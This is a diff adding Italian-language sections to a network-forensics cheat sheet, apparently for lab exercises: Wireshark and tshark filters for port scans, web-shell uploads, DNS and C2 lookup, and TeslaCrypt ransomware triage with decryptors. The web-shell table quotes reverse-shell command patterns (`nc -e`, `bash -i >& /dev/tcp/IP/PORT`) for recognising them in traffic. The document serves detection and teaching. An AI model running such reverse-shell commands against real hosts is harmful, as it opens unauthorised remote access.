@@ -26,6 +26,7 @@
 | Sospetta steganografia (immagine "pesante"/anomala) | §9 | steghide · StegCracker |
 | CSV prodotto da un altro tool (PECmd/RBCmd) | §5 | CSVQuickViewer |
 | Un IOC da arricchire | §10 | MISP · OSINT |
+| File cifrato (`.micro`, `.locky`...) + ransom note | §2 | Ransomware nel PCAP → decryptor |
 | Un **incidente reale** da gestire (phishing, malware, ransomware...) | §13 | Runbook |
 
 ---
@@ -325,13 +326,28 @@ icmp.type == 8                       ← echo request verso molti IP = ping swee
 ### Port scan
 tcp.flags.syn == 1 && tcp.flags.ack == 0          ← SYN (scan + inizio connessioni)
 tcp.flags.reset == 1                              ← RST = porta chiusa
-ip.src == <attaccante> && tcp.flags.syn == 1 && tcp.flags.ack == 0
+ip.src == <attaccante> && tcp.flags.syn == 1 && tcp.flags.ack == 0   ← + colonna tcp.dstport → range porte
+tcp.flags.syn == 1 && tcp.flags.ack == 1          ← SYN/ACK = porte APERTE (Source = vittima)
+tcp.flags == 0x000 / 0x001 / 0x029                ← NULL / FIN / Xmas scan
  
 ### HTTP
 http.request.method == "GET" / "POST"
 http.response.code == 200 / 404
 http.request.uri contains "robots"
 http.server                                       ← banner del web server (es. Apache/2.4.38)
+http.user_agent                                   ← tool dell'attaccante (gobuster, sqlmap, nikto...) → Apply as Column
+http.request.method == "POST" && http.content_type contains "multipart"   ← UPLOAD di file
+http.request.uri contains "cmd="                  ← comandi alla web shell (il 1° per frame = 1° comando)
+http.referer                                      ← pagina da cui parte la richiesta (form di upload!)
+http.request.full_uri                             ← URL COMPLETO (http://host:porta/path) → Apply as Column
+http.request.uri contains ".exe"                  ← download di eseguibili (anche .dll .ps1 .hta .zip)
+
+### DNS
+dns.flags.response == 0                           ← solo query (colonna Info = dominio richiesto)
+dns.qry.name                                      ← Apply as Column → ordina A→Z per scorrere i domini
+dns.qry.name matches "^d"                         ← dominio che INIZIA con "d" (regex, case-insensitive)
+dns.qry.name contains "xyz"                       ← dominio che contiene una stringa
+dns.a                                             ← IP risolto nella risposta (dominio → IP C2)
  
 ### FTP
 ftp.request.command == "USER"                     ← username tentati
@@ -363,6 +379,8 @@ ftp-data                                          ← contenuto dei file trasfer
 | **Esportare file trasmessi** | `File → Export Objects → HTTP` (o SMB/FTP-DATA/TFTP) → colonna `Packet` per trovare il pacchetto giusto · `Content Type` (es. `application/zip`) |
 | **Dall'export al pacchetto** | Click sulla riga in Export Objects → salta al pacchetto nella finestra principale |
 | **Saltare a un pacchetto** | `Ctrl+G` → numero |
+| **OS / interfaccia / durata della cattura** | `Statistics → Capture File Properties` → sezione *Capture* → campo **OS** (copialo ESATTO, es. `32-bit Windows 7 Service Pack 1, build 7601`) |
+| **Lista domini risolti** | `Statistics → Resolved Addresses` (o colonna `dns.qry.name`) |
 | **Aggiungere colonna** | Right-click su campo header → **Apply as Column** |
 | **Mostrare data e ora reali** | `View → Time Display Format → Date and Time of Day` (default = secondi dall'inizio cattura!) |
 | **Filtrare da una statistica** | Right-click su riga → **Apply as Filter → Selected** |
@@ -378,15 +396,61 @@ Pacchetto con la risposta del server (`200 OK` + contenuto) → pannello **TCP**
 | **Conversations** | Chi↔chi, porte, byte/pacchetti | Molto inviato + poco ricevuto = exfil · **1 src → 1 dst, porte dst diverse, 2 pacchetti ciascuna (SYN+RST) = port scan** (tab TCP) · tab **Ethernet** per ARP |
 | **Endpoints** | Volume per host | Trasmette>>riceve = upload/exfil · Riceve>>trasmette = download |
  
+### Port scan — chi, range, tipo
+| Domanda | Come |
+|---|---|
+| **Chi scansiona?** | `Statistics → Endpoints → IPv4` ordina per Packets · oppure `Conversations → TCP`: 1 IP sorgente con centinaia di righe verso lo stesso host (1 riga = 1 porta) |
+| **Range porte** | Filtro SYN dell'attaccante + colonna `tcp.dstport` → ordina ↑ e ↓ (min–max) · oppure `Conversations` ✅ *Limit to display filter* → ordina **Port B** · tipico `1-1024` o `1-65535` |
+| **Tipo di scan** | `Follow → TCP Stream` su una porta APERTA e guarda il pacchetto dopo il SYN/ACK (tabella sotto) |
+
+| Scan | Porta aperta | Porta chiusa |
+|---|---|---|
+| **SYN** (half-open, `nmap -sS`) | SYN → SYN/ACK → **RST** dall'attaccante | SYN → RST/ACK |
+| **Connect** (full, `nmap -sT`) | SYN → SYN/ACK → **ACK** → RST/ACK | SYN → RST/ACK |
+| **NULL / FIN / Xmas** | flag `0x000` / `0x001` / `0x029` → nessuna risposta | RST/ACK |
+| **UDP** | nessuna risposta | ICMP *port unreachable* (`icmp.type == 3 && icmp.code == 3`) |
+
+💡 SYN con **window size 1024** = tipico di nmap `-sS`.
+
+### Attacco web nel PCAP — tool → upload → web shell → comandi
+| Domanda | Dove guardare |
+|---|---|
+| **Tool usati** (oltre allo scanner di porte) | `http.user_agent` → colonna. NON cercarli nel TCP |
+| **Pagina usata per l'upload** | POST multipart → header **`Referer`** = pagina col form (es. `editprofile.php`). L'URI (es. `upload.php`) è solo lo script che riceve il file ⚠️ |
+| **Nome della web shell** | Stessa POST → `MIME Multipart` → `Content-Disposition: ... filename="X.php"` · oppure `File → Export Objects → HTTP` · conferma: GET successiva a `/uploads/X.php?...` |
+| **Parametro dei comandi** | `?cmd=` / `?c=` / `?exec=` nell'URI delle GET alla shell |
+| **Primo comando** | `http.request.uri contains "cmd="` → ordina per `No.` → il primo · decodifica `%20` e `+` = spazio · conferma con Follow HTTP Stream (`id` → `uid=33(www-data)`) |
+| **Tipo di shell / porta** | Payload nel comando (`nc -e`, `bash -i >& /dev/tcp/IP/PORT`, `python -c socket`) = **reverse** shell → la porta è nel comando · poi `tcp.flags.syn == 1 && ip.src == <vittima>` = connessione in uscita verso l'attaccante |
+
+**User-Agent da riconoscere**
+| UA | Tool |
+|---|---|
+| `gobuster/x.x` · `DirBuster` · `Fuzz Faster U Fool` · `Wfuzz` | Directory / file brute force (molti GET, molti **404**) |
+| `sqlmap/x.x` | SQL injection (POST/GET con payload SQL) |
+| `Nikto` | Scanner di vulnerabilità web |
+| `Nmap Scripting Engine` | Script NSE di nmap |
+| `WPScan` | Scanner WordPress |
+| `curl/` · `python-requests/` · `Wget/` | Script / download manuale |
+
+💡 **Se c'è tshark**, la lista degli UA in un colpo:
+```bash
+tshark -r file.pcap -Y http.request -T fields -e http.user_agent | sort | uniq -c
+tshark -r file.pcap -Y 'http.request.uri contains "cmd="' -T fields -e frame.number -e http.request.uri
+```
+
 ### Workflow tipico su un PCAP sconosciuto
 ```
 1. View → Time Display Format → Date and Time of Day   → subito, prima di leggere orari
+   Statistics → Capture File Properties → OS, durata, n. pacchetti
 2. Statistics → Protocol Hierarchy      → panoramica, protocolli anomali
 3. Primi pacchetti: ARP/ICMP?           → host discovery (IP dopo "Tell" = scanner)
 4. Statistics → Conversations → TCP     → chi parla con chi, volumi, port scan
 5. Filtra sul protocollo/host sospetto  (ftp, http, ecc.)
 6. Follow TCP Stream                    → leggi la conversazione in chiaro
 7. File → Export Objects → HTTP         → estrai file trasmessi
+8. http.user_agent                      → tool dell'attaccante
+9. POST multipart → Referer + filename  → pagina di upload + nome web shell
+10. uri contains "cmd="                 → comandi eseguiti (ordine per No.)
 ```
 💡 **FTP e HTTP sono in chiaro** → credenziali e file leggibili con Follow Stream.
  
@@ -399,6 +463,29 @@ unzip cr4ckx0r.zip                    # estrai (o GUI: right-click → Extract H
 md5sum <file_interno>                 # hash del file dentro lo ZIP
 cat <pagina>.html                     # pagina 404 esportata → versione del server nel footer
 ```
+
+### Ransomware nel PCAP → famiglia → decryptor
+| Domanda | Come |
+|---|---|
+| **Eseguibile scaricato** | `Export Objects → HTTP` → Filename `.exe` / Content Type `application/x-msdownload` o `octet-stream` |
+| **URL completo** | Colonna `http.request.full_uri` sulla GET · oppure Follow HTTP Stream → `Host:` + porta + URI (es. `http://10.0.2.15:8000/safecrypt.exe`) |
+| **Hash** | Save dell'oggetto → `md5sum` / `sha256sum` |
+| **Nome della famiglia** | Hash su VirusTotal (dal TUO browser) → nome più ricorrente tra i vendor (es. TeslaCrypt) |
+| **Algoritmo di cifratura** | Leggi la **ransom note** (`cat` / editor): di solito dichiara l'algoritmo (es. RSA-4096) |
+| **Dominio C2** | Filtri `dns.*` sopra · cerca domini lunghi/random o non aziendali subito dopo l'esecuzione |
+| **Decifrare il file** | Estensione dei file cifrati (es. `.micro`) + famiglia → **ID Ransomware** / **No More Ransom** → decryptor specifico |
+
+**Decryptor noti (famiglie da lab)**
+| Famiglia | Estensioni tipiche | Tool |
+|---|---|---|
+| TeslaCrypt | `.micro` `.mp3` `.ccc` `.vvv` `.xxx` `.ttt` | **TeslaDecoder** (BloodDolly) · McAfee **TeslaDecrypt** (TeslaCrack NON gestisce `.micro`) |
+
+```bash
+wine TeslaDecoder.exe                  # su Linux un .exe di Windows parte con wine
+tesladecrypt.exe -l E:\                # elenca i file cifrati
+tesladecrypt.exe -r <cartella>         # decifra ricorsivamente (-d = cancella i cifrati dopo)
+```
+⚠️ Lavora su una **copia** del file cifrato. Senza internet nel lab → controlla se il decryptor è già sulla VM (Desktop / cartella Tools).
 
 ---
 
@@ -1183,6 +1270,9 @@ PRI = (Facility Code × 8) + Severity Value
 | Linux: permission denied | `sudo chown <user> <file>` o prefissa `sudo` |
 | Windows: cartelle non visibili | `dir /a` |
 | MISP: job pending, nessun evento | Avvia i worker (`start.sh`) |
+| Wireshark: risposta "ovvia" rifiutata (es. `upload.php`) | Controlla **Referer**, redirect `3xx` (header `Location`) e nome del campo nel form |
+| Wireshark: nome file rifiutato | Copialo **esatto** dal pacchetto: maiuscole/minuscole contano (`Dbfunctions.php` ≠ `dbfunctions.php`) |
+| Wireshark: tool di recon non trovati nel TCP | Cercali negli **User-Agent** HTTP (`http.user_agent`) |
 
 ---
 
